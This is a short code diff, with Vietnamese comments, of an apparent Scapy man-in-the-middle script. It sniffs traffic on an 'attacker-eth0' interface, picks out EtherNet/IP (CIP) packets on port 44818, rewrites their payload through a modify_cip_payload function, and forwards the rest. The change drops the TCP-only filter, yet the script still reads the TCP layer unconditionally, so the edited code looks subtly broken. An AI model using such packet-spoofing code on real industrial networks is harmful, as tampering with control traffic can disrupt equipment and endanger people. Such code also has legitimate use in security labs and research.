@@ -27,7 +27,7 @@ def modify_cip_payload(data):
 
 # Xử lý gói tin
 def spoof_pkt(pkt):
-    if pkt.haslayer(IP) and pkt.haslayer(TCP):
+    if pkt.haslayer(IP) :
         if pkt[TCP].dport == 44818 or pkt[TCP].sport == 44818:
             # Phân tích payload
             data = bytes(pkt[TCP].payload)
@@ -43,6 +43,8 @@ def spoof_pkt(pkt):
         else:
             # Forward các gói tin khác
             send(pkt)
+    else:
+        send(pkt)
 
-# Lọc và chặn gói tin TCP
-pkt = sniff(iface='attacker-eth0', filter='tcp', prn=spoof_pkt)
+# Lọc và chặn gói tin 
+pkt = sniff(iface='attacker-eth0', prn=spoof_pkt)
